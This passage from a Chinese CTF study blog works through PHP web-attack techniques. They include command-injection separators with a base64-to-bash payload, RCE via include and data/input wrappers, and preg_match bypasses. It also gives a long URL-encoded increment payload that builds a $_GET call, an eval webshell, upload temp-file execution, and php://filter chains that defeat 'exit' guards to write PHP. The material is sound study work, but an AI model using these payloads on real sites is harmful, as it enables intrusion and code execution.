class="hljs-string">后面的语句</span><span class="hljs-string"></span><span class="hljs-string">&amp;   命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span><span class="hljs-string">&amp;&amp;  命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls -all &quot;</span>.$this-&gt;filename);     <span class="hljs-comment">#DASCTF2023&amp;0X401比赛题</span><span class="hljs-keyword">system</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&quot;aksldj&quot;</span>);<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;curl &quot;</span>.$_GET[<span class="hljs-string">&#x27;url&#x27;</span>].<span class="hljs-string">&quot;.dnslog.cn&quot;</span>);</code></pre></div><div class="code-wrapper"><pre><code class="hljs gherkin"><span class="hljs-comment">#由于;我无法尝试，此处不讨论;能否使用</span>第一个: 大佬payload: ;echo bHMgLwo|<span class="hljs-string">base64 -d</span>|<span class="hljs-string">bash;    题目复现过，是可行的</span><span class="hljs-string">第二个: </span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span><span class="hljs-string">第三个: 由于是curl,前面可以使用</span>||<span class="hljs-string">(直接</span>|<span class="hljs-string">也行),后面</span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span></code></pre></div><h2 id="data协议和input协议与include和highlight-file"><a href="#data协议和input协议与include和highlight-file" class="headerlink" title="data协议和input协议与include和highlight_file"></a>data协议和input协议与include和highlight_file</h2><blockquote><p>data协议条件</p><ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul><p>input协议条件</p><ul><li>allow_url_fopen:随便</li><li>allow_url_include :on</li></ul></blockquote><p>关于include能执行命令，我是模糊的，一直到2023SCTF的<code>fumo_backdoor</code>（与2022CISCN的考点相同），他们之间的区别是一个是include、一个是highlight_file（与题目的考点无关，但确实会对题目中的操作有影响），我在复现时看文章能写木马，但复现却不行，问了<code>unknown</code>师傅才知道，能执行代码完全靠的是<code>include</code>的函数，而<code>highlight_file</code>这类的就完全不行！</p><p><code>include</code>能配合<code>data</code>、<code>input</code>伪协议进行命令执行，而<code>highlight_file</code>显示代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901162551316.png" alt="image-20230901162551316"></p><h3 id="filter协议就不说了"><a href="#filter协议就不说了" class="headerlink" title="filter协议就不说了"></a>filter协议就不说了</h3><h3 id="Boogipop大佬总结"><a href="#Boogipop大佬总结" class="headerlink" title="Boogipop大佬总结"></a>Boogipop大佬总结</h3><p>所谓的什么伪协议流，其实就是读取文件或者写入内容到文件，并且储存到变量里面<br>不要搞混了哦</p><h2 id="preg-match误区"><a href="#preg-match误区" class="headerlink" title="preg_match误区"></a>preg_match误区</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-variable">$str</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901170008293.png" alt="image-20230901170008293"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901165657391.png" alt="image-20230901165657391"></p><p>完了，为什么啊，与大佬结果不一样，（我测试了7.3.4和7.0.9和5.6.9三个版本都不回显）</p><h3 id="m修饰符"><a href="#m修饰符" class="headerlink" title="m修饰符"></a>m修饰符</h3><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901171700257.png" alt="image-20230901171700257"></p><p><code>m</code>是一定要搭配<code>^</code>或者<code>$</code>来使用的，匹配的是**<code>每一行</code>**的开头或结尾</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&#x27;/^flag/im&#x27;</span>, <span class="hljs-variable">$str</span>)</span></span>)&#123;</code></pre></div><p>所以无法用%0a进行绕过</p><h3 id="preg-match的绕过技巧"><a href="#preg-match的绕过技巧" class="headerlink" title="preg_match的绕过技巧"></a>preg_match的绕过技巧</h3><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (preg_match(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;    <span class="hljs-attribute">echo</span> <span class="hljs-variable">$flag</span>;&#125;</code></pre></div><p><code>?a=flag%0a</code></p><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><h4 id="PCRE回溯次数限制绕过"><a href="#PCRE回溯次数限制绕过" class="headerlink" title="PCRE回溯次数限制绕过"></a>PCRE回溯次数限制绕过</h4><p>一般是写脚本上传超过1000000的数据，就会被绕过</p><h5 id="新了解的方法"><a href="#新了解的方法" class="headerlink" title="新了解的方法"></a>新了解的方法</h5><p><code>.htaccess</code>文件设置pcre回溯次数</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span><span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span></code></pre></div><p>将正则匹配的回溯次数设为0，来达到绕过的效果</p><h4 id="限制次数绕过"><a href="#限制次数绕过" class="headerlink" title="限制次数绕过"></a>限制次数绕过</h4><p><code>preg_match(&#39;/[0-9a-zA-Z]&#123;2&#125;/&#39;,$p) === 1</code>（匹配到两次）</p><p>每一个字符前加上单引号可以绕过preg_match的匹配：                                      </p><p>payload：<code>p=&#39;Z&#39;m&#39;x&#39;h&#39;Z&#39;y&#39;5&#39;w&#39;a&#39;H&#39;A&#39;=</code></p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901174857243.png" alt="image-20230901174857243"></p><p>根据<code>&amp;</code>解析变量</p><div class="code-wrapper"><pre><code class="hljs zephir">parse_str(<span class="hljs-string">&quot;a=1%26b=2%26c=3&quot;</span>);     <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&amp;b=2&amp;c=3&#x27;</span>parse_str(<span class="hljs-string">&quot;a=1&amp;b=2&amp;c=3&quot;</span>);<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;2&#x27;</span><span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;3&#x27;</span></code></pre></div><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>取反、异或都需要php7的环境（确实好像php5用不了）</p><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>大佬给出的异或脚本真好用，嘿嘿</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>php取反很方便</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p><code>[].[]</code>返回ArrayArray          <code>_/_</code>返回NAN</p><p>由此自增构造字符</p><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>=(_/_._)[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;_&#x27;</span>];<span class="hljs-regexp">//</span><span class="hljs-variable constant_">NAN</span><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;    <span class="hljs-regexp">//</span>O<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>=_;     <span class="hljs-regexp">//</span>_<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;   <span class="hljs-regexp">//</span>_P<span class="hljs-variable">$_</span>++;   <span class="hljs-regexp">//</span>Q<span class="hljs-variable">$_</span>++;    <span class="hljs-regexp">//</span>R<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POS<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POST<span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[__](<span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[_]);  <span class="hljs-regexp">//</span><span class="hljs-variable">$_POST</span>[__](<span class="hljs-variable">$_POST</span>[_])</code></pre></div><div class="code-wrapper"><pre><code class="hljs mel">#Boogipop大佬自增的结果%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b<span class="hljs-comment">//$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><span class="hljs-comment">//ASSERT($_POST[_]);   php小于7</span>%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b</code></pre></div><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p><code>?</code>    <code>*</code></p><h2 id="缓存文件"><a href="#缓存文件" class="headerlink" title="缓存文件"></a>缓存文件</h2><p><code>/tmp/phpxxxxxx</code></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);</code></pre></div><p>文件上传后首先会保存为临时文件<code>/tmp/phpxxxxxx</code></p><p>执行该文件</p><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /tmp/phpxxxxxx`</span></code></pre></div><h3 id="2023cnss新生赛"><a href="#2023cnss新生赛" class="headerlink" title="2023cnss新生赛"></a>2023cnss新生赛</h3><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment">#door.php</span>&lt;<span class="hljs-string">?=</span>. /<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span></code></pre></div><p>在door.php路由下上传php文件</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;1.php&quot;Content-<span class="hljs-keyword">Type</span>: application/octet-stream#!/bin/bashls<span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;;提交<span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT--</span></code></pre></div><h2 id="pathinfo-漏洞"><a href="#pathinfo-漏洞" class="headerlink" title="pathinfo()漏洞"></a>pathinfo()漏洞</h2><p><code>/</code>获取文件名，根据<code>.</code>获取文件后缀</p><p><code>1.php/.</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901212548383.png" alt="image-20230901212548383"></p><h2 id="parse-url解析漏洞"><a href="#parse-url解析漏洞" class="headerlink" title="parse_url解析漏洞"></a>parse_url解析漏洞</h2><div class="code-wrapper"><pre><code class="hljs scss">php parse_url最后一个@后的为hostlibcurl第一个@后的host<span class="hljs-attribute">http</span>://<span class="hljs-attribute">u</span>:p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span><span class="hljs-keyword">@b</span>.com/php解析结果：    <span class="hljs-attribute">schema</span>: http     <span class="hljs-attribute">host</span>: b.com    <span class="hljs-attribute">user</span>: u    <span class="hljs-attribute">pass</span>: p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span>libcurl解析结果：    <span class="hljs-attribute">schema</span>: http    <span class="hljs-attribute">host</span>: a.com    <span class="hljs-attribute">user</span>: u    <span class="hljs-attribute">pass</span>: p    <span class="hljs-attribute">port</span>: <span class="hljs-number">80</span>    后面的<span class="hljs-keyword">@b</span>.com/会被忽略掉</code></pre></div><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="finfo-open-（检查文件头，十六进制第一行信息）"><a href="#finfo-open-（检查文件头，十六进制第一行信息）" class="headerlink" title="finfo_open  （检查文件头，十六进制第一行信息）"></a>finfo_open  （检查文件头，十六进制第一行信息）</h3><p>修改后缀不起作用</p><div class="code-wrapper"><pre><code class="hljs lsl">finfo_open的参数   控制返回结果FILEINFO_NONE (<span class="hljs-type">integer</span>)无特殊处理。FILEINFO_SYMLINK (<span class="hljs-type">integer</span>)跟随符号链接。FILEINFO_MIME_TYPE (<span class="hljs-type">integer</span>)返回 mime 类型。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。FILEINFO_MIME_ENCODING (<span class="hljs-type">integer</span>)返回文件的 mime 编码。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。FILEINFO_MIME (<span class="hljs-type">integer</span>)按照 RFC <span class="hljs-number">2045</span> 定义的格式返回文件 mime 类型和编码。FILEINFO_COMPRESS (<span class="hljs-type">integer</span>)解压缩压缩文件。 由于线程安全问题，自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 禁用。FILEINFO_DEVICES (<span class="hljs-type">integer</span>)查看设备的块内容或字符。FILEINFO_CONTINUE (<span class="hljs-type">integer</span>)返回全部匹配的类型。FILEINFO_PRESERVE_ATIME (<span class="hljs-type">integer</span>)如果可以的话，尽可能保持原始的访问时间。FILEINFO_RAW (<span class="hljs-type">integer</span>)对于不可打印字符不转换成 \ooo 八进制表示格式。FILEINFO_EXTENSION (<span class="hljs-type">integer</span>)根据 MIME 类型返回适当的文件扩展名。 有的文件类型具有多种扩展名，例如 JPEG 将会返回多个扩展名， 以斜杠分隔，比如 <span class="hljs-string">&quot;jpeg/jpg/jpe/jfif&quot;</span>。 如果在 magic.mime 数据库里类型未知，则返回的是 <span class="hljs-string">&quot;???&quot;</span>。 PHP <span class="hljs-number">7.2</span><span class="hljs-number">.0</span> 起有效。</code></pre></div><p><code>finfo_file()</code>返回<code>finfo_open</code>设置的参数对应的信息</p><h3 id="Getimagesize（检测文件头，读取文件的前八位的十六进制）"><a href="#Getimagesize（检测文件头，读取文件的前八位的十六进制）" class="headerlink" title="Getimagesize（检测文件头，读取文件的前八位的十六进制）"></a>Getimagesize（检测文件头，读取文件的前八位的十六进制）</h3><p>返回文件大小和文件类型</p><p>上传只有第一行文件头的图片</p><p>finfo_open识别为了png图片，但是getimagesize函数并没有识别成功  （给新生上强度）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220715920.png" alt="image-20230901220715920"></p><p>往图片第二行随便加东西</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220818065.png" alt="image-20230901220818065"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220943156.png" alt="image-20230901220943156"></p><p>成功识别</p><h3 id="exif-imagetype-（GIF89a应该是用来饶过他的）"><a href="#exif-imagetype-（GIF89a应该是用来饶过他的）" class="headerlink" title="exif_imagetype   （GIF89a应该是用来饶过他的）"></a>exif_imagetype   （GIF89a应该是用来饶过他的）</h3><p>只是返回数字（数组中的索引）</p><div class="code-wrapper"><pre><code class="hljs asciidoc">1IMAGETYPE<span class="hljs-emphasis">_GIF</span><span class="hljs-emphasis">2IMAGETYPE_JPEG</span><span class="hljs-emphasis">3IMAGETYPE_PNG</span><span class="hljs-emphasis">4IMAGETYPE_SWF</span><span class="hljs-emphasis">5IMAGETYPE_PSD</span><span class="hljs-emphasis">6IMAGETYPE_BMP</span><span class="hljs-emphasis">7IMAGETYPE_TIFF_II（Intel 字节顺序）</span><span class="hljs-emphasis">8IMAGETYPE_TIFF_MM（Motorola 字节顺序）</span><span class="hljs-emphasis">9IMAGETYPE_JPC</span><span class="hljs-emphasis">10IMAGETYPE_JP2</span><span class="hljs-emphasis">11IMAGETYPE_JPX</span><span class="hljs-emphasis">12IMAGETYPE_JB2</span><span class="hljs-emphasis">13IMAGETYPE_SWC</span><span class="hljs-emphasis">14IMAGETYPE_IFF</span><span class="hljs-emphasis">15IMAGETYPE_WBMP</span><span class="hljs-emphasis">16IMAGETYPE_</span>XBM</code></pre></div><h2 id="死亡代码"><a href="#死亡代码" class="headerlink" title="死亡代码"></a>死亡代码</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>建议看看Boogipop大佬的文章，讲的很好</p><p>常规的我就不写了，写一下我没见过的</p><h4 id="php7先压缩再解压（测试有问题）"><a href="#php7先压缩再解压（测试有问题）" class="headerlink" title="php7先压缩再解压（测试有问题）"></a>php7先压缩再解压（测试有问题）</h4><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=a.php&#x27;</span>;<span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>大佬的示例</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902065000143.png" alt="image-20230902065000143"></p><p>我的示例（php7.3.4和7.1.9都不行）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902065554692.png" alt="image-20230902065554692"></p><p>呜呜，又与大佬不一样了</p><h3 id="死亡代码变种"><a href="#死亡代码变种" class="headerlink" title="死亡代码变种"></a>死亡代码变种</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#插入无关代码在filename处正常解析</span>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php<span class="hljs-comment">#当文件名</span>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></pre></div><p>和大佬说的一样，使用上述两个代码都只能创建文件，无法生成内容</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>写入的内容拼接起来是<code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p><p>都知道<code>=</code>在base64中的作用是填充，也就是以为着结束；在<code>=</code>的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的</p><p>即<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>作为<code>=</code>后的内容，会被忽略或使解码失败</p><h4 id="解决办法（1）"><a href="#解决办法（1）" class="headerlink" title="解决办法（1）"></a>解决办法（1）</h4><p>嵌套过滤器    string.strip.tags|convert.base64-decode</p><p>初代payload：<code> php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>只能说实在是妙啊</p><p>创建<code>?&gt;PD9waHAgcGhwaW5mbygpOz8+</code>文件，内容拼接起来是<code>&lt;?php exit();php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>先去除标签，就只剩下<code>PD9waHAgcGhwaW5mbygpOz8%2B.php</code>然后再进行<code>base64-decode</code></p><p>实操发现会报错。。。。。</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902073626707.png" alt="image-20230902073626707"></p><p>我在想是不是要先创建文件，当创建文件时，我悟了，windows的文件命名不能有<code>?&gt;</code>等字符，只能在<code>linux</code>环境中尝试（难怪大佬的图使用linux），既然如此，我也复现不了了，没有环境，还不会docker启环境</p><p>然后就能生成文件，但在访问的时候，大佬发现文件名有问题，会出现访问不到的情况，原因是引号</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902074746052.png" alt="image-20230902074746052"></p><p>我们看到生成的文件是带有引号的，正常的文件是不带有的</p><p>大佬这里使用伪目录的方法</p><p>最终payload:<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>作为内容时，剩下的<code>PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>仍可以被解析</p><p>作为文件名时，<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B</code>被当作一个目录（虽然不存在），然后<code>../</code>又回到了本来的目录，于是生成<code>s1mple.php</code></p><p>我把过滤器去掉尝试后发现确实可以生成<code>s1mple.php</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902075804794.png" alt="image-20230902075804794"></p><h4 id="大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）"><a href="#大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）" class="headerlink" 